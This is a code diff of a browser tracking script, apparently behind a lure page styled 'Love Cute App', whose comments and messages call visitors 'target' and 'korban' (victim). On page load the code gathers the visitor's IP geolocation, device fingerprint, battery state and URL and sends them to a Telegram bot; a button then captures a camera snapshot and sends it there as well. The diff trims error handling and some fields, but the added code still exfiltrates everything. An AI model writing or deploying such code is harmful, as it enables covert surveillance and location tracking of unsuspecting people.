@@ -60,9 +60,8 @@ function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll(
 async function getIpInfo(){
   try{
     const r = await fetch("https://ipwhois.app/json/");
-    if (!r.ok) throw new Error(`Gagal mengambil IP: ${r.status}`);
     const data = await r.json();
-    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", isp:"-", org:"-", asn:"-"};
+    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
     return {
       ip: data.ip || "-",
       city: data.city || "-",
@@ -70,182 +69,87 @@ async function getIpInfo(){
       country_name: data.country || "-",
       country_code: data.country_code || "-",
       latitude: data.latitude || "0",
-      longitude: data.longitude || "0",
-      isp: data.isp || "-",
-      org: data.org || "-",
-      asn: data.asn || "-"
+      longitude: data.longitude || "0"
     };
   }catch(e){
-    console.error("Error di getIpInfo:", e);
-    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", isp:"-", org:"-", asn:"-"};
+    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
   }
 }
 
 // Ambil device info
 async function getDeviceInfo(){
-  try {
-    const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
-    return {
-      userAgent:navigator.userAgent,
-      platform:navigator.platform,
-      language:navigator.language,
-      languages:navigator.languages ? navigator.languages.join(", ") : "-",
-      screenWidth:screen.width,
-      screenHeight:screen.height,
-      innerWidth:window.innerWidth,
-      innerHeight:window.innerHeight,
-      availWidth:screen.availWidth,
-      availHeight:screen.availHeight,
-      colorDepth:screen.colorDepth,
-      pixelDepth:screen.pixelDepth,
-      pixelRatio:window.devicePixelRatio,
-      cores:navigator.hardwareConcurrency||"-",
-      memory:navigator.deviceMemory||"-",
-      touchPoints:navigator.maxTouchPoints||0,
-      orientation:screen.orientation?.type||"-",
-      online:navigator.onLine,
-      cookiesEnabled:navigator.cookieEnabled,
-      doNotTrack:navigator.doNotTrack,
-      javaEnabled:navigator.javaEnabled(),
-      pdfViewerEnabled:navigator.pdfViewerEnabled,
-      vendor:navigator.vendor,
-      vendorSub:navigator.vendorSub,
-      battery:b
-    };
-  } catch (e) {
-    console.error("Error di getDeviceInfo:", e);
-    // Return a default object to prevent the script from crashing
-    return {
-      userAgent:navigator.userAgent, // This is almost always available
-      platform:navigator.platform,
-      language:navigator.language,
-      languages:"-",
-      screenWidth:screen.width,
-      screenHeight:screen.height,
-      innerWidth:window.innerWidth,
-      innerHeight:window.innerHeight,
-      availWidth:screen.availWidth,
-      availHeight:screen.availHeight,
-      colorDepth:screen.colorDepth,
-      pixelDepth:screen.pixelDepth,
-      pixelRatio:window.devicePixelRatio,
-      cores:"-",
-      memory:"-",
-      touchPoints:"-",
-      orientation:"-",
-      online:navigator.onLine,
-      cookiesEnabled:navigator.cookieEnabled,
-      doNotTrack:navigator.doNotTrack,
-      javaEnabled:"-",
-      pdfViewerEnabled:"-",
-      vendor:navigator.vendor,
-      vendorSub:navigator.vendorSub,
-      battery: {level:null,charging:false,chargingTime:null,dischargingTime:null}
-    };
-  }
+  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
+  return {
+    userAgent:navigator.userAgent,
+    platform:navigator.platform,
+    language:navigator.language,
+    screenWidth:screen.width,
+    screenHeight:screen.height,
+    innerWidth:window.innerWidth,
+    innerHeight:window.innerHeight,
+    cores:navigator.hardwareConcurrency||"-",
+    memory:navigator.deviceMemory||"-",
+    touchPoints:navigator.maxTouchPoints||0,
+    orientation:screen.orientation?.type||"-",
+    colorDepth:screen.colorDepth||"-",
+    pixelRatio:window.devicePixelRatio||"-",
+    online:navigator.onLine,
+    cookiesEnabled:navigator.cookieEnabled,
+    doNotTrack:navigator.doNotTrack,
+    battery:b
+  };
 }
 
-// Build caption Telegram dengan HTML v4 dan blockquote
+// Build caption Telegram
 function buildCaption(ip,d){
   const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
-  const timestamp = new Date().toISOString();
-  const localTime = new Date().toLocaleString();
-  
   return [
-    "<b>🔍 INFORMATION TARGET 🔍</b>",
-    "",
-    "<blockquote>",
-    "<b>📍 Location Information</b>",
-    `IP: <code>${escapeHtml(ip.ip)}</code>`,
+    "<b>INFORMATION TARGET</b>",
+    `IP: ${escapeHtml(ip.ip)}`,
     `City: ${escapeHtml(ip.city)}`,
     `Region: ${escapeHtml(ip.region)}`,
-    `Country: ${escapeHtml(ip.country_name)} ${escapeHtml(ip.country_code)}`,
-    `Coordinates: <code>${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}</code>`,
-    `ISP: ${escapeHtml(ip.isp)}`,
-    `Organization: ${escapeHtml(ip.org)}`,
-    `ASN: ${escapeHtml(ip.asn)}`,
-    `🗺️ <a href="${g}">View on Google Maps</a>`,
-    "</blockquote>",
+    `Country: ${escapeHtml(ip.country_name)}`,
+    `Country Code: ${escapeHtml(ip.country_code)}`,
+    `Latitude: ${escapeHtml(ip.latitude)}`,
+    `Longitude: ${escapeHtml(ip.longitude)}`,
+    `Location: ${g}`,
     "",
-    "<blockquote>",
-    "<b>📱 Device Information</b>",
-    `User Agent: <code>${escapeHtml(d.userAgent)}</code>`,
+    "<b>Device Info</b>",
+    `User Agent: ${escapeHtml(d.userAgent)}`,
     `Platform: ${escapeHtml(d.platform)}`,
     `Language: ${escapeHtml(d.language)}`,
-    `Languages: ${escapeHtml(d.languages)}`,
-    `Screen: <code>${escapeHtml(d.screenWidth+"x"+d.screenHeight)}</code>`,
-    `Available Screen: <code>${escapeHtml(d.availWidth+"x"+d.availHeight)}</code>`,
-    `Viewport: <code>${escapeHtml(d.innerWidth+"x"+d.innerHeight)}</code>`,
-    `Color Depth: <code>${escapeHtml(d.colorDepth)} bit</code>`,
-    `Pixel Depth: <code>${escapeHtml(d.pixelDepth)} bit</code>`,
-    `Pixel Ratio: <code>${escapeHtml(d.devicePixelRatio)}</code>`,
-    `CPU Cores: ${escapeHtml(d.cores)}`,
-    `RAM: ${escapeHtml(d.memory)} GB`,
+    `Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
+    `Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
+    `CPU cores: ${escapeHtml(d.cores)}`,
+    `RAM (GB): ${escapeHtml(d.memory)}`,
     `Touch Points: ${escapeHtml(d.touchPoints)}`,
     `Orientation: ${escapeHtml(d.orientation)}`,
-    `Connection: ${escapeHtml(d.online ? "Online" : "Offline")}`,
-    `Cookies: ${escapeHtml(d.cookiesEnabled ? "Enabled" : "Disabled")}`,
-    `Do Not Track: ${escapeHtml(d.doNotTrack || "Not Set")}`,
-    `Java Enabled: ${escapeHtml(d.javaEnabled ? "Yes" : "No")}`,
-    `PDF Viewer: ${escapeHtml(d.pdfViewerEnabled ? "Enabled" : "Disabled")}`,
-    `Vendor: ${escapeHtml(d.vendor)}`,
-    `Vendor Sub: ${escapeHtml(d.vendorSub)}`,
-    `🔋 Battery: ${escapeHtml(d.battery?.level ? Math.round(d.battery.level * 100) + "%" : "-")} (${d.battery?.charging?"Charging":"Not charging"})`,
-    `⏱️ Charging Time: ${escapeHtml(d.battery?.chargingTime ? Math.round(d.battery.chargingTime / 60) + " min" : "-")}`,
-    `⏳ Discharging Time: ${escapeHtml(d.battery?.dischargingTime ? Math.round(d.battery.dischargingTime / 60) + " min" : "-")}`,
-    "</blockquote>",
+    `Color Depth: ${escapeHtml(d.colorDepth)}`,
+    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
+    `Online: ${escapeHtml(d.online)}`,
+    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
+    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
+    `Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging":"Not charging"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s`,
     "",
-    "<blockquote>",
-    "<b>🌐 URL & Time Information</b>",
-    `URL: <code>${escapeHtml(location.href)}</code>`,
-    `Referrer: <code>${escapeHtml(document.referrer)}</code>`,
-    `Time (UTC): <code>${escapeHtml(timestamp)}</code>`,
-    `Local Time: <code>${escapeHtml(localTime)}</code>`,
-    `Timezone: <code>${escapeHtml(Intl.DateTimeFormat().resolvedOptions().timeZone)}</code>`,
-    `Timezone Offset: <code>${escapeHtml(new Date().getTimezoneOffset() / -60)} hours</code>`,
-    "</blockquote>",
-    "",
-    "<i>📸 Captured by Love Cute App</i>"
+    "<b>URL & Time</b>",
+    `URL: ${escapeHtml(location.href)}`,
+    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
   ].join("\n");
 }
 
 // Kirim IP/device + foto statis saat halaman load
 async function sendIpDevice(){
-  try {
-    const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
-    const caption = buildCaption(ip,d);
-    
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        photo: STATIC_IMAGE,
-        caption: caption,
-        parse_mode:"HTML"
-      })
-    });
-
-    if (!response.ok) {
-      const errorData = await response.json();
-      throw new Error(`Gagal mengirim ke Telegram: ${response.status} ${response.statusText}. Detail: ${errorData.description}`);
-    }
-    
-    console.log("Data korban berhasil dikirim!");
-
-  } catch (error) {
-    console.error("KESALAHAN KRUSIAL: Data korban gagal dikirim.", error);
-    // Optional: Kirim notifikasi error ke diri sendiri jika pengambilan data gagal total
-    // fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    //   method: "POST",
-    //   headers:{"Content-Type":"application/json"},
-    //   body: JSON.stringify({
-    //     chat_id: CHAT_ID,
-    //     text: `❌ ERROR: Gagal mengirim data korban.\n\nError: ${error.message}`,
-    //     parse_mode: "HTML"
-    //   })
-    // });
-  }
+  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      photo: STATIC_IMAGE,
+      caption: buildCaption(ip,d),
+      parse_mode:"HTML"
+    })
+  });
 }
 
 // Kamera snapshot sebagai file .jpg (document)
@@ -270,30 +174,22 @@ async function sendSnapshot(){
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("document", blob, "screenshotbyaldofficialr.jpg");
-    formData.append("caption", "<b>📸 Sukes screenshot foto target</b>\n\n<i>Captured with Love Cute App</i>");
-    formData.append("parse_mode", "HTML");
+    formData.append("caption", "Sukes screenshot foto target");
 
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: "POST",
       body: formData
     });
 
-    if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(`Gagal mengirim foto ke Telegram: ${response.status} ${response.statusText}. Detail: ${errorData.description}`);
-    }
-
-    console.log("Foto berhasil dikirim!");
-
     stream.getTracks().forEach(track=>track.stop());
     video.remove();
   }catch(e){
-    console.error("Gagal mengambil atau mengirim foto:", e);
+    console.log("yahhh", e);
   }
 }
 
 // Jalankan saat halaman load
-window.addEventListener("load", sendIpDevice);
+window.addEventListener("load",sendIpDevice);
 
 // Tombol klik kamera
 document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
